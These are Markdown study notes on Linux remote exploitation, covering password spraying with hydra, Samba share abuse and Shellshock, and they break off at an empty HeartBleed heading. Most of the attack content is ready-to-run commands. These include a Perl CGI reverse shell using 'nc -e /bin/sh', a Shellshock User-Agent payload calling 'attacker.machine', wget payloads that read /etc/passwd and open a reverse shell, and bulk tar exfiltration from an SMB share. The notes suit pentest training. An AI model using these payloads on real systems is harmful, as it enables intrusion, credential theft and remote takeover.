# Notes - Linux Exploitation - Remote-Exploitation

## Password Spray Attack

- Create users list from this github `https://github.com/insidetrust/statistically-likely-usernames`:
```bash
head -n 50 john.txt >> users.txt
```
- User enumeration using `metasploit -> smtp_enum` and then put the users valid to a file `user_valid.txt`:
```bash
msf > use auxiliary/scanner/smtp/smtp_enum

> set RHOSTS <IP Target>
> set USER_FILE users.txt
> run
```
- SSH, SMTP and SMB are some services we can try our password spray attack against.
- Using `hydra` for brute force attack -> SSH:
```bash
hydra -L users.txt -P passwords.txt ssh://<IP target>
``` 
- Using credential against other systems on then network:
```bash
hydra -l pepito -p pepito123 -M ssh_servers.txt ssh

-M = to specify a list of ssh servers
```
## Exploiting Samba

`SAMBA` -> It provides `file sharing services` to both Windows and Linux users.

- Sambe vulnarable to 4.6.4 version (CVE-2017-7494)

- Identify SAMBA version :
```bash
nmap --script smb-os-discovery -p445 <target IP>
```
- Investigate which vulnerability exists for that version :
```bash
searchsploit samba 3.0.20
```
- Username Map Script :
```bash
https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/
```
- Samba Symlink Directory Traversal is misconfiguration in Samba:
```bash
https://www.samba.org/samba/news/symlink_attack.html
https://www.rapid7.com/db/modules/auxiliary/admin/smb/samba_symlink_traversal/
```
- The vulnerability essentially allows an attacker to create a symbolic link to the root (/) partition from a writeable share ultimately allowing for read access to the entire file system outside of the share directory.
- A pre-requisite to this particular vulnerability requires that the Samba server contains a writeable share and that the "widelinks" parameter in the smb.conf file is set with a value of "yes".
- `smbmap` determines shares available:
```bash
smbmap -H <target IP>
smbclient \\<taregt IP> -N
-> -N anonymous access to the share is allowed and no password is required.
```
- Command for data exfiltration, we can create an archive of all files within a current directory :
```bash
smb: tar c /all_files.tar *

> ls -als all_files.tar
> tar xf /tmp/all_files.tar
> cd /directoty/interesting
> grep -r "password" * 2>&1 /dev/null
```
- `Writeable Samba Share to remote command execution via perl revrse shell`
```bash
smbmap -H 192.168.13.21

-> I see that I have a share with READ and WRITE access
-> Questions:
Is PHP installed? Are there any other web server-interpreted languages we can use to our advantage? Can we upload any files to this directory, and how will the web server handle our files? Can we exploit that to obtain remote command execution?
```
- Connect to share :
```bash
smbclient \\<target IP>\www -N
> ls

For example if I see a file on 'pl'(perl), that means the server on this
```
- Create a file perl and upload with smbclient:
```bash
--> test.pl
#!/usr/bin/perl
print "Content-type: text/html\n\n";
system("id");


smbclient \\<target IP>\www -N
> put test.pl
```
- Webshell on Kali Linux -> `/usr/share/webshells/perl`
- `Netcat` has other uses, such as transferring files and data exfiltration.
```bash
nc -nlvp 1234

-n = to use numeric- only IP addresses (no dns) 
-l = in listen mode
-v = verbose
-p = the port we want to listen on
```
- Other reverse shell or go to `monkey pentester`:
```bash
#!/usr/bin/perl

print "Content-type: text/html\n\n";
system("nc <My IP> 1234 -e /bin/sh");
```

## Exploiting Shellshock

- command :
```bash
env x=‘() { :;}; echo vulnerable’ bash -c “echo this is a test”

> this is a test
```
- One of the primary attack vectors that was seen in the wild following the disclosure of Shellshock was the modification of `User-Agent` strings to include Shellshock payloads intended to run commands on the remote server.
```bash
User-Agent: () { :;}; ping -c 5 -p unique_string attacker.machine
```
- First to do is to locate `CGI` program on the target -> `dirsearch` will help
```bash
./dirsearch.py -u http://192.168.13.29/ -e cgi -r

status 200 -> /cgi-bin/login.cgi

-e = extensions
-r = recursive
```
- Command nmap checks for shellshock exploitation:
```bash
nmap --script http-shellshock --script-args uri=/cgi-bin/login.cgi 192.168.13.29 -p 80
```
- Summarize:
```bash
1. Identified a web server with a cgi-bin directory, containing a “login.cgi” file with dirsearch.
2. Confirmed that the file and/or server is likely vulnerable to Shellshock, with the "http-shellshock" Nmap NSE script.
```
- Confirm the vulnerability:
```bash
wget -U "() { foo;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://192.168.13.29/cgi-bin/login.cgi && cat login.cgi

-U = User-Agent
Use a User-Agent (-U) to echo the contents of /etc/passwd to a local file on our attacker system (login.cgi), and will then display its contents to us (&& cat login.cgi)
```
- To get a reverse shell:
```bash
my shell => nc -nlvp 1234

target shell => wget -U "() { foo;};echo; /bin/nc <My IP> 1234 -e /bin/sh" http://<target IP>/cgi-bin/login.cgi

```
## Exploiting HeartBleed















